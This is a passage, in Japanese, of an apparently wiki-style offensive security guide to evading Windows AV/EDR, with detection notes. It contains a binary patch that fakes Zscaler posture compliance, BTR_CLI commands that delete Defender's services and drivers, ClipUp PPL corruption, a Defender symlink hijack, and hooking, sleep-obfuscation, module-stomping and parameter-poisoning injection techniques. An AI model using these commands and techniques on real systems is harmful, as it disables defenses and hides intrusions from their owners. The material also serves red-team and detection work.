pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

元のファイルを置き換えてサービススタックを再起動すると：

* **すべての** posture checks が **green/compliant** と表示されます。
* 署名のないバイナリや改変されたバイナリが、名前付きパイプの RPC エンドポイント（例：`\\RPC Control\\ZSATrayManager_talk_to_me`）を開けるようになります。
* 侵害されたホストは、Zscaler ポリシーで定義された内部ネットワークへ無制限にアクセスできるようになります。

このケーススタディは、クライアント側だけで行われる信頼判定と単純な署名チェックが、わずかなバイトパッチで回避されることを示しています。

## Microsoft Defender `BTR.sys` の信頼された機能の悪用

Defender の **Boot-Time Removal** ドライバーは、従来型の BYOVD に対する有用な反例です。`BTR.sys` は、メモリ破損バグも IOCTL インターフェースもない、Microsoft 署名済みの正規の修復コンポーネントです。管理者アクセスと `SeLoadDriverPrivilege` を取得した後、オペレーターはその代わりに、プライベートな修復トランザクションを偽造し、意図された Ring-0 のファイル／レジストリ操作を実行できます。これは **侵害後の AV/EDR 無効化プリミティブであり、初期アクセスや権限昇格ではありません**。また、目立つサードパーティ製ドライバーを持ち込むのではなく、標的自身の `MpEngine.dll` にある `BOOTTIMETOOL` リソースからドライバーを抽出できます。<sup>[[36]](#references)</sup>

### ワンショットドライバーの準備

Defender は通常、このリソースをランダムな `[a-z]{8}.sys` ファイルとして配置し、同じような名前のカーネルサービスを登録します。`DriverEntry` はサービスの `Args` 値を読み取り、参照先の NTFS ADS を開いて、アクションリストを復号・検証し、フィードバックを書き込みます。実行に成功すると、ドライバーが常駐せずにアンロードされるよう、`0xC0000056`（`STATUS_DELETE_PENDING`）を返します。偽造したサービスには、次の特徴的な値を設定します。<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

`:changelist` ストリームには、RC4で暗号化されたblobが1つ含まれています。解析対象のビルドでは固定の256バイトキーが再利用されるため、暗号化は認可境界にはなりません。有効な平文は、24バイトのグローバルヘッダー（`Magic=0xFEE1DEAD`、`Version=2`、`PayloadOffset=0x10`、ヘッダーCRC、ペイロードから導出されるトランザクションID）に続き、NUL終端のUTF-16 feedback pathと任意個数のアイテムで構成されます。各アイテムは16バイトのヘッダー（`DataSize`、`Action`、`HeaderCRC`、`DataCRC`）と、アクション固有のデータで構成され、末尾には**ちょうど4バイトのNUL**が必要です。各ヘッダー／データ領域は、CRC-32多項式`0xEDB88320`、初期状態`0xFFFFFFFF`、**final XORなし**（`~CRC32`）で個別に検証されます。CRC状態は領域ごとにリセットされます。<sup>[[36]](#references)[[37]](#references)</sup>

受け付けられるアクションIDにより、以下のカーネルプリミティブが利用できます。<sup>[[36]](#references)[[37]](#references)</sup>

| ID | アイテムデータ | 結果 |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | ロックされたファイルを含め、ファイルを削除 |
| 2 | `[UTF-16 path]` | 空のディレクトリを削除 |
| 3 | `[Flags][source][destination]` | 攻撃者が選択した保護対象パスへファイルを移動。destinationが空の場合は削除 |
| 4 | `[Flags][key path]` | レジストリキーを再帰的に削除 |
| 5 | `[Flags][key path + "\\" + value]` | レジストリ値を削除 |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | レジストリ値を作成／更新し、不足しているキーのパスを作成 |

アクション5と6では、オンワイヤ上のkey/value区切りは**連続する2つのバックスラッシュ**です。一般的な形式で記述したパスは正しく分割されません。feedback fileはおおむねリクエストを反映しますが、各アイテムの先頭4バイトのデータは、結果の`NTSTATUS`に置き換わります。先頭にflagsフィールドがないアクション1と2では、ステータス用の領域を確保するため、BTRはパスを末尾の予約済み4バイトに移動します。<sup>[[36]](#references)</sup>

### `BTR_CLI` workflow and early-boot window

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI)は、一連の処理をすべて実行します。ローカルのDefenderから`BTR.sys`を抽出し、`<random>.sys:changelist`とfeedback streamを作成し、連鎖したアクションをシリアライズ／チェックサム計算／暗号化した後、サービスのレジストリキーを直接作成します。続いて、`-trigger now`の場合は`NtLoadDriver`を呼び出し、`-trigger boot`の場合はsystem-start driverとして残します。レジストリを直接ステージングするため、通常のSCM `CreateServiceW`経路を回避でき、サービスインストールのEvent ID 7045は**発生しません**。ブートトリガーで作成されたアーティファクトは、後から`BTR_CLI.exe -cleanup <service_name>`で削除できます。<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0`は使用できません。BTRはストレージスタックと`SystemRoot`リンクの準備が整う前に、`DriverEntry`からファイルI/Oを実行するためです。`Start=1`と優先度の高い`Boot Bus Extender`グループを組み合わせると、Phase 1で実行されます。この時点ではNTFSは使用可能ですが、多くのシステム起動セキュリティドライバーやユーザーモードのEDRサービスはまだ初期化されていません。`WdFilter`などのブート起動フィルターがすでにロードされている場合でも、BTRは次回の起動前にそのバイナリやサービス構成を削除でき、SCMがサービス実行ファイルを起動する前に削除することもできます。BTRはブート起動時の評価後に実行され、有効なMicrosoft署名を持つため、ELAMではこの隙間を塞げません。<sup>[[36]](#references)</sup>

複数のアクションが1つのトランザクション内で実行されます。PoCでは、ハードコードされた`\SystemRoot\Temp\BootClean.log`に対するAction 1を先頭に追加します。BTRはこのログを作成した後、自身の削除要求を処理し、アンロード前にログを削除します。これにより証拠を減らせます。また、フィードバックを`<random>.sys:<random>.dat`に格納すると、ドライバーと両方のストリームをまとめて削除できます。<sup>[[36]](#references)[[37]](#references)</sup>

### 高シグナルの検出相関

署名のみを対象とするルールやMicrosoftの脆弱なドライバーのブロックリストでは、BTRの本来の機能の悪用に対処できません。正規のDefenderの系譜と任意のランチャーを区別しつつ、次のような挙動の相関を優先してください。<sup>[[36]](#references)</sup>

- **Sysmon 15:** `.sys:changelist`の作成は、BTRのステージングで常に発生します。同じ`.sys`に付加された`.dat` ADSは特に疑わしいものです。正規のDefenderは通常、フィードバックを`C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`以下に格納するためです。
- **System 7045を伴わないSysmon 12/13:** `Args=...:changelist`と`Group=Boot Bus Extender`を含む`HKLM\SYSTEM\CurrentControlSet\Services\<random>`の直接作成を、対応するSCMのインストールイベントがないことと相関させます。
- **Sysmon 6 -> 23:** Defender以外の系譜に属する既知のBTRドライバーのロードと、それに続く`System`/PID 4によるファイル削除を相関させます。特にセキュリティ関連のバイナリが対象の場合は注意してください。
- **Sysmon 11 -> 23:** `System`/PID 4による`\SystemRoot\Temp\BootClean.log`の短時間での作成と削除をアラートします。
- `SeLoadDriverPrivilege`の割り当てや有効化を制限し、監査します。`cmd.exe`、PowerShell、または不明なプロセスによってセキュリティツールのドライバーがステージングされている場合、Microsoft署名だけでは信頼の根拠として不十分です。

## LOLBINを使ってProtected Process Light (PPL)を悪用し、AV/EDRを改変する

Protected Process Light (PPL)は署名者とレベルの階層を適用し、同等以上に保護されたプロセスのみが相互に改変できるようにします。攻撃側の観点では、PPL対応バイナリを正規の方法で起動し、その引数を制御できれば、ログ記録などの無害な機能を、AV/EDRが使用する保護対象ディレクトリに書き込むための、制約付きのPPLベースのプリミティブに転用できます。<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

プロセスをPPLとして実行する条件
- 対象のEXE（およびロードされるDLL）は、PPL対応のEKUで署名されている必要があります。
- プロセスは、次のフラグを指定してCreateProcessで作成する必要があります: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`。
- バイナリの署名者に合致する互換性のある保護レベルを要求する必要があります（例: マルウェア対策の署名者には`PROTECTION_LEVEL_ANTIMALWARE_LIGHT`、Windowsの署名者には`PROTECTION_LEVEL_WINDOWS`）。誤ったレベルを指定すると、作成に失敗します。

PP/PPLとLSASS保護の概要については、こちらも参照してください。

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

ランチャーツール
- オープンソースのヘルパー: CreateProcessAsPPL（保護レベルを選択し、引数を対象のEXEに渡す）:
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- 使用パターン:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN プリミティブ: ClipUp.exe
- 署名済みシステムバイナリ `C:\Windows\System32\ClipUp.exe` は自分自身を起動し、呼び出し元が指定したパスにログファイルを書き込むパラメーターを受け取ります。
- PPL プロセスとして起動すると、PPL の権限でファイルが書き込まれます。
- ClipUp はスペースを含むパスを解析できません。通常は保護されている場所を指定するには、8.3 短縮パスを使います。

8.3 短縮パスの確認方法
- 短縮名の一覧を表示する: 各親ディレクトリで `dir /x` を実行します。
- cmd で短縮パスを取得する: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

悪用チェーン（概要）
1) ランチャー（例: CreateProcessAsPPL）を使い、`CREATE_PROTECTED_PROCESS` を指定して PPL 対応の LOLBIN（ClipUp）を起動します。
2) ClipUp のログパス引数を指定し、保護された AV ディレクトリ（例: Defender Platform）にファイルを作成させます。必要に応じて 8.3 短縮名を使います。
3) 対象バイナリが実行中に AV によって通常ロックされる場合（例: MsMpEng.exe）、AV の起動前に書き込みが行われるよう、確実に早い段階で実行される自動起動サービスをインストールして、起動時に書き込みを行うよう設定します。Process Monitor のブートログで起動順序を確認します。
4) 再起動すると、AV がバイナリをロックする前に PPL の権限で書き込みが行われ、対象ファイルが破損して起動できなくなります。

実行例（安全のためパスは省略または短縮）:

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Notes and constraints
- ClipUp が書き込む内容は配置場所を除いて制御できません。このプリミティブは、正確な内容の注入ではなく破損に適しています。
- サービスのインストール／起動と再起動の時間帯には、ローカル管理者／SYSTEM 権限が必要です。
- タイミングが重要です。対象が開かれていない必要があります。起動時に実行すればファイルロックを回避できます。

Detections
- 起動前後に、特に標準的でないランチャーを親プロセスとして、通常とは異なる引数で `ClipUp.exe` がプロセス作成されていないか確認します。
- 不審なバイナリを自動起動するよう設定された新しいサービスや、Defender/AV より常に先に起動するサービスを確認します。Defender の起動失敗に先立つサービスの作成／変更を調査します。
- Defender のバイナリ／Platform ディレクトリに対するファイル整合性監視を行います。保護プロセスフラグを持つプロセスによる予期しないファイルの作成／変更を確認します。
- ETW/EDR テレメトリでは、`CREATE_PROTECTED_PROCESS` を指定して作成されたプロセスや、AV 以外のバイナリによる異常な PPL レベルの使用を確認します。

Mitigations
- WDAC/Code Integrity：PPL として実行できる署名済みバイナリと、その親プロセスを制限します。正規のコンテキスト以外での ClipUp の呼び出しをブロックします。
- サービスの管理：自動起動サービスの作成／変更を制限し、起動順序の操作を監視します。
- Defender の改ざん防止と早期起動保護が有効になっていることを確認します。バイナリの破損を示す起動エラーを調査します。
- 環境との互換性がある場合は、セキュリティツールを配置したボリュームでの 8.3 短縮名生成の無効化を検討します（十分にテストしてください）。

## Platform バージョンフォルダーの Symlink Hijack による Microsoft Defender の改ざん

Windows Defender は、次の場所にあるサブフォルダーを列挙して、実行する Platform を選択します。
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

最も辞書順で大きいバージョン文字列（例：`4.18.25070.5-0`）を持つサブフォルダーを選択し、そこから Defender サービスのプロセスを起動します（サービス／レジストリのパスもそれに応じて更新します）。この選択では、ディレクトリの再解析ポイント（symlink を含む）も信頼されます。管理者はこれを利用して Defender を攻撃者が書き込み可能なパスにリダイレクトし、DLL sideloading またはサービスの妨害を実行できます。<sup>[[21]](#references)[[22]](#references)</sup>

前提条件
- ローカル管理者権限（Platform フォルダー内にディレクトリ／symlink を作成するために必要）
- 再起動、または Defender による Platform の再選択を実行する手段（起動時のサービス再起動）
- 必要なのは組み込みツールのみ（mklink）

仕組み
- Defender は自身のフォルダーへの書き込みをブロックしますが、Platform の選択ではディレクトリエントリを信頼し、対象が保護／信頼されたパスに解決されるかを検証せずに、辞書順で最も大きいバージョンを選択します。

手順（例）
1) 現在の Platform フォルダーの書き込み可能なクローンを準備します。例：`C:\TMP\AV`】【。
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform 内に、自分のフォルダーを指す、より高いバージョンのディレクトリ symlink を作成します:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) トリガーの選択（再起動を推奨）：
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend) がリダイレクト先のパスから実行されていることを確認します。
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
新しいプロセスパスが `C:\TMP\AV\` 配下にあり、サービス構成/レジストリにもその場所が反映されていることを確認してください。

Post-exploitation options
- DLL sideloading/code execution: Defender がアプリケーションディレクトリから読み込む DLL を配置/置換し、Defender のプロセス内でコードを実行します。上記のセクションを参照してください: [DLL Sideloading & Proxying](#dll-sideloading--proxying)。
- Service kill/denial: バージョンシンボリックリンクを削除すると、次回起動時に構成済みのパスが解決されず、Defender は起動に失敗します:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> この technique 自体では privilege escalation はできない点に注意してください。admin rights が必要です。

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red team は、target module の Import Address Table (IAT) を hook し、選択した API を攻撃者が制御する position-independent code (PIC) にルーティングすることで、runtime evasion を C2 implant の外へ移し、target module 自体で実行できます。この方法により、多くの kit が公開する限られた API（例: CreateProcessA）を超えて evasion を一般化し、同じ保護を BOF や post-exploitation DLL にも適用できます。<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

概要
- reflective loader を使い、target module とともに PIC blob を配置します（先頭に追加するか、付属させます）。PIC は自己完結型で、position-independent である必要があります。
- host DLL の読み込み時に、その IMAGE_IMPORT_DESCRIPTOR をたどり、対象の import（例: CreateProcessA/W、CreateThread、LoadLibraryA/W、VirtualAlloc）の IAT entry を、薄い PIC wrapper を指すように patch します。
- 各 PIC wrapper は、実際の API address に tail-call する前に evasion を実行します。一般的な evasion には次のものがあります。
  - call の前後で memory を mask/unmask する（例: beacon 領域を暗号化する、RWX→RX に変更する、page の名前や permissions を変更する）うえで、call 後に元に戻します。
  - Call-Stack Spoofing: 偽装した stack を構築し、target API に遷移することで、call-stack analysis で想定どおりの frame が解決されるようにします。<sup>[[9]](#references)</sup>
- 互換性を確保するため、Aggressor script（または同等のもの）が Beacon、BOF、post-ex DLL 用に hook する API を登録できる interface を export します。

ここで IAT hooking を使う理由
- hook した import を使用するコードであれば適用でき、tool code の変更や、特定の API を Beacon に proxy させる必要がありません。
- post-ex DLL にも適用できます。LoadLibrary* を hook すると module の読み込み（例: System.Management.Automation.dll、clr.dll）を intercept し、それらの API call に同じ masking/stack evasion を適用できます。
- CreateProcessA/W を wrapper することで、call-stack ベースの detection に対して、process を起動する post-ex command を安定して使用できます。

最小限の IAT hook の概要（x64 C/C++ pseudocode）
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
メモ
- relocations/ASLR後、importの初回使用前にpatchを適用します。TitanLdr/AceLdrのようなReflective loaderは、ロードされたモジュールのDllMain中にhookする方法を示しています。
- wrapperは小さく、PIC-safeに保ちます。patch前に取得した元のIAT値、またはLdrGetProcedureAddress経由で本来のAPIを解決します。
- PICにはRW → RXの遷移を使い、書き込み可能かつ実行可能なページを残さないでください。

Call-stack spoofing stub
- Draugr風のPIC stubは、偽のcall chain（無害なモジュール内のreturn address）を構築してから、本来のAPIへ移行します。
- これにより、Beacon/BOFから機微なAPIへの正規のstackを想定する検出を回避できます。
- stack cutting/stack stitchingの手法と組み合わせ、APIのprologue前に想定されるframe内へ到達させます。

運用への統合
- Reflective loaderをpost-ex DLLの先頭に追加し、DLLのロード時にPICとhookを自動で初期化します。
- Aggressor scriptで対象APIを登録すれば、コードを変更せずにBeaconとBOFが同じ回避経路を透過的に利用できます。

検出/DFIRでの考慮事項
- IATの整合性: 非image（heap/anon）アドレスに解決されるentry、import pointerの定期的な検証。
- Stackの異常: ロード済みimageに属さないreturn address、非image PICへの急な遷移、一貫しないRtlUserThreadStartの祖先関係。
- Loaderのテレメトリ: プロセス内でのIAT書き込み、import thunkを変更するDllMainの早期処理、ロード時に作成される予期しないRX領域。
- Image-loadの回避: LoadLibrary*をhookする場合、自動化/clr assemblyの不審なロードと、メモリマスキングイベントとの相関を監視します。

関連する構成要素と例
- ロード時にIAT patchingを実行するReflective loader（例: TitanLdr、AceLdr）
- Memory masking hook（例: simplehook）とstack-cutting PIC（stackcutting）
- PIC call-stack spoofing stub（例: Draugr）


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### 常駐PICOによるImport-time IAT hook

Reflective loaderを制御できる場合、`ProcessImports()`中にloaderの`GetProcAddress` pointerを、最初にhookを確認するカスタムresolverで置き換えてimportをhookできます:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- 一時的なloader PICの解放後も存続する**resident PICO**（永続的なPIC object）を構築します。
- `setup_hooks()`関数をexportし、loaderのimport resolver（例: `funcs.GetProcAddress = _GetProcAddress`）を上書きします。
- `_GetProcAddress`ではordinal importをスキップし、`__resolve_hook(ror13hash(name))`のようなhashベースのhook検索を行います。hookがあればそれを返し、なければ本来の`GetProcAddress`に処理を委ねます。
- Crystal Palaceの`addhook "MODULE$Func" "hook"` entryを使い、link時にhook対象を登録します。hookはresident PICO内にあるため有効なままです。

これにより、ロード後にロード済みDLLのcode sectionをpatchすることなく、**import-time IAT redirection**が実現します。

### 対象がPEB-walkingを使う場合にhook可能なimportを強制する

Import-time hookが実行されるのは、その関数が対象のIATに実際に存在する場合だけです。モジュールがPEB-walk + hashでAPIを解決し（import entryがない場合）、Reflective loaderの`ProcessImports()`経路で処理されるよう、実際のimportを強制します。

- hashによるexport解決（例: `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`）を、`&WaitForSingleObject`のような直接参照に置き換えます。
- compilerがIAT entryを生成するため、Reflective loaderがimportを解決する際にinterceptionが可能になります。

### `Sleep()`をpatchしないEkko風のsleep/idle obfuscation

`Sleep`をpatchする代わりに、implantが実際に使うwait/IPC primitive（`WaitForSingleObject(Ex)`、`WaitForMultipleObjects`、`ConnectNamedPipe`）をhookします。長時間のwaitでは、Ekko風のobfuscation chainでidle中にメモリ上のimageを暗号化するようcallをwrapします:<sup>[[31]](#references)[[27]](#references)</sup>

- `CreateTimerQueueTimer`で一連のcallbackをスケジュールし、細工した`CONTEXT` frameを使って`NtContinue`を呼び出します。
- 一般的なchain（x64）: imageを`PAGE_READWRITE`に設定 → `advapi32!SystemFunction032`でmap済みimage全体をRC4暗号化 → blocking waitを実行 → RC4で復号 → PE sectionを走査して**sectionごとの権限を復元** → 完了を通知。
- `RtlCaptureContext`でtemplateとなる`CONTEXT`を取得し、複数のframeにcloneして、各ステップを呼び出すようregister（`Rip/Rcx/Rdx/R8/R9`）を設定します。

運用上の詳細: 長いwait（例: `WAIT_OBJECT_0`）では「success」を返し、imageがマスクされている間にcallerが処理を続けるようにします。この手法はidle中のscannerからモジュールを隠し、典型的な「patch済み`Sleep()`」のsignatureを避けます。

検出の手がかり（テレメトリベース）
- `NtContinue`を呼び出す`CreateTimerQueueTimer` callbackの集中発生。
- 大きく連続したimageサイズのbufferに対する`advapi32!SystemFunction032`の使用。
- 広範囲の`VirtualProtect`実行後に、独自のsection単位の権限復元が行われること。

### Sleep-obfuscation gadgetのRuntime CFG登録

CFG対応targetでは、`jmp [rbx]`や`jmp rdi`のような関数途中のgadgetへの最初のindirect jumpで、通常はプロセスが`STATUS_STACK_BUFFER_OVERRUN`によりcrashします。これはgadgetがモジュールのCFG metadataに存在しないためです。hardeningされたプロセス内でEkko/Kraken風のchainを動作させるには:<sup>[[30]](#references)</sup>

- chainで使うすべてのindirect destinationを、`NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)`と`CFG_CALL_TARGET_VALID` entryで登録します。
- ロード済みimage（`ntdll`、`kernel32`、`advapi32`）内のアドレスでは、`MEMORY_RANGE_ENTRY`を**image base**から開始し、**image全体のサイズ**をカバーする必要があります。
- 手動map/PIC/stomp済み領域では、代わりに**allocation base**とallocation sizeを使います。
- dispatch gadgetだけでなく、間接的に到達するexport（`NtContinue`、`SystemFunction032`、`VirtualProtect`、`GetThreadContext`、`SetThreadContext`、wait/event syscall）や、indirect targetとなる攻撃者制御下のexecutable sectionも登録します。

これにより、ROP/JOP風のsleep chainを「CFG無効のプロセスでのみ動作する」ものから、`/guard:cf`付きでcompileされた`explorer.exe`、browser、`svchost.exe`などのendpointで再利用できるprimitiveに変えられます。

### Sleep中のthread向けCET-safe stack spoofing

`CONTEXT`を完全に置き換える方法は目立ちやすく、CET Shadow Stack環境では、spoofした`Rip`がhardware shadow stackと一致する必要があるため問題が起きることがあります。より安全なsleep-masking手法は次のとおりです:<sup>[[30]](#references)</sup>

- 同じprocess内の別threadを選び、`NtQueryInformationThread`経由でその`NT_TIB` / TEBのstack境界（`StackBase`、`StackLimit`）を読み取ります。
- 現在のthreadの実際のTEB/TIBをbackupします。
- `GetThreadContext`で実際のsleep中のcontextを取得します。
- spoof contextには、実際の`Rip`**だけ**をコピーし、spoofした`Rsp`/stack stateはそのままにします。
- sleep中はspoof threadの`NT_TIB`を現在のTEBにコピーし、stack walkerが正当なstack範囲内でunwindするようにします。
- waitの終了後、元のTIBとthread contextを復元します。

これによりCETと整合するinstruction pointerを保ちながら、TEBのstack metadataを信頼してunwindを検証するEDRのstack walkerを欺けます。

### 代替手法: APCベースのKraken Mask

timer-queue dispatchのsignatureが強すぎる場合、同じsleep-encrypt-spoof-restore処理を、queue済みAPCを使ってsuspended helper threadから実行できます:<sup>[[27]](#references)</sup>

- entrypointを`NtTestAlert`にしたhelper threadを作成します。
- `NtQueueApcThread`で準備済みの`CONTEXT` frame/APCをqueueし、`NtAlertResumeThread`で処理します。
- defaultの64 KB thread stackを使い切らないよう、chain stateはhelper stackではなくheapに保存します。
- `NtSignalAndWaitForSingleObject`で開始eventの通知とblockを原子的に行います。
- scannerが復元途中のstackを検出するrace windowを短くするため、TIB/contextを復元する前にmain threadをsuspendします（`NtSuspendThread` → restore → `NtResumeThread`）。

これにより、同じRC4 maskingとstack-spoofingの目的を維持しながら、`CreateTimerQueueTimer` + `NtContinue`のsignatureをhelper-thread/APCのsignatureに置き換えられます。

追加の検出の手がかり
- sleep、wait、APC dispatchの直前に`VmCfgCallTargetInformation`を指定して`NtSetInformationVirtualMemory`を呼び出すこと。
- `WaitForSingleObject(Ex)`、`NtWaitForSingleObject`、`NtSignalAndWaitForSingleObject`、`ConnectNamedPipe`の前後で`GetThreadContext`/`SetThreadContext`を使うこと。
- `NtQueryInformationThread`の後に、現在のthreadのTEB/TIB stack境界へ直接書き込むこと。
- `SystemFunction032`、`VirtualProtect`、section権限復元helperへ間接的に到達する`NtQueueApcThread`/`NtAlertResumeThread` chain。
- 署名付きモジュール内で、dispatch pivotとして短いgadget signature（`FF 23`（`jmp [rbx]`）や`FF E7`（`jmp rdi`）など）を繰り返し使うこと。


## Precision Module Stomping

Module stompingは、明らかに分かるprivate executable memoryをallocateしたり、新しい犠牲DLLをロードしたりする代わりに、**target process内にすでにmapされているDLLの`.text` sectionからpayloadを実行します**。上書き先には、プロセスが引き続き必要とするcode pathを破損させずにpayloadを収められる、**ロード済みでdisk-backedのimage**を選ぶ必要があります。<sup>[[1]](#references)[[2]](#references)</sup>

### 信頼性の高いtarget選定

`uxtheme.dll`や`comctl32.dll`のような一般的なmoduleに対する単純なstompingは脆弱です。DLLがremote process内にロードされていない場合があり、code領域が小さすぎるとprocessがcrashします。より信頼性の高い手順は次のとおりです。

1. target processのmoduleを列挙し、すでにロードされているDLLのみを含む**名前だけのinclude list**を作成します。
2. 最初にpayloadをbuildし、**正確なbyte size**を記録します。
3. disk上の候補DLLを走査し、PE sectionの**`.text` `Misc_VirtualSize`**とpayloadのサイズを比較します。これは、imageをmemoryにmapした**とき**のexecutable sectionのサイズを示すため、file sizeより重要です。
4. **Export Address Table (EAT)**を解析し、stomp開始offsetとしてexportされたfunctionのRVAを選びます。
5. **blast radius**を計算します。payloadが選択したfunctionの境界を超えると、memory上でその後ろに配置された隣接exportを上書きします。

実環境で見られる一般的なrecon/選定helper:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

運用上の注意
- `LoadLibrary` のテレメトリや予期しないイメージのロードを避けるため、リモートプロセスで**すでにロードされている** DLL を優先する。
- 対象アプリケーションで実行される頻度が低い export を優先する。そうでないと、スレッド作成の前後に通常のコードパスが stomp されたバイト列に到達する可能性がある。
- 大きな implant では、injector のソース内でバッファ全体が正しく表現されるよう、shellcode の埋め込み形式を文字列リテラルから**バイト配列／波括弧付き初期化子**に変更する必要がある場合が多い。

検出のアイデア
- よくある private RWX/RX allocation ではなく、**イメージに裏付けられた実行可能ページ**（`MEM_IMAGE`、`PAGE_EXECUTE*`）へのリモート書き込み。
- メモリ上の export エントリポイントのバイト列が、ディスク上のバックアップファイルと一致しなくなっている。
- 最初のバイト列が最近変更された正規 DLL export 内から実行を開始するリモートスレッドやコンテキストのピボット。
- DLL の `.text` ページに対する不審な `VirtualProtect(Ex)`／`WriteProcessMemory` の呼び出しに続くスレッド作成。

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) は、従来のリモート書き込み経路（`VirtualAllocEx` + `WriteProcessMemory`）を回避する**process-injection／EDR回避**手法です。すでに実行中のターゲットにバイト列をコピーする代わりに、Windows が選択された `CreateProcessW` の起動パラメータを子プロセスに**コピー**し、`PEB->ProcessParameters`（`RTL_USER_PROCESS_PARAMETERS`）内に格納する仕組みを悪用します。<sup>[[28]](#references)[[29]](#references)</sup>

### `CreateProcessW` がコピーする、ポイズニング可能なキャリア

有用なキャリアは次のとおりです。

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment`（`CREATE_UNICODE_ENVIRONMENT` と併用）→ `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

キャリアを使用する際の実用上の制約：

- `CreateProcessW` に渡す `lpCommandLine` は**書き込み可能なメモリ**を指す必要があり、null 終端文字を含めて **32,767 Unicode 文字**までに制限される。
- `lpEnvironment` は、連続する `NAME=VALUE\0` 文字列と、その後に追加の `\0` が続く Unicode 環境ブロックでなければならない。
- `lpReserved` は公式には予約済みであるため、`ShellInfo` へのマッピングは、安定した文書化済みの仕様ではなく、実装の詳細として扱うべきである。

これにより、通常のプロセス作成が**payload 転送プリミティブ**になる。オペレーターは攻撃者が制御する起動データを指定して子プロセスを作成し、Windows にプロセス間コピーを実行させる。

### リモート書き込み API を使わないリモート検索フロー

子プロセスの作成後、**読み取り専用**プリミティブを使ってコピーされたバッファを特定する：

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` を取得
2. リモートの `PEB` を読み取る
3. `PEB.ProcessParameters` をたどる
4. `RTL_USER_PROCESS_PARAMETERS` を読み取る
5. 選択したポインターを使う：
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

最小限のフロー：

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### コピーされたパラメータバッファの実行

コピーされたパラメータ領域は通常 `RW` であり、実行可能ではありません。一般的な P3 chain は次のとおりです。

1. プロセスを通常どおり作成する（suspended にしない）
2. `NtProtectVirtualMemory` / `VirtualProtectEx` で選択したパラメータページを実行可能にする
3. `PROCESS_INFORMATION` で既に返されたメインスレッドのハンドルを再利用する
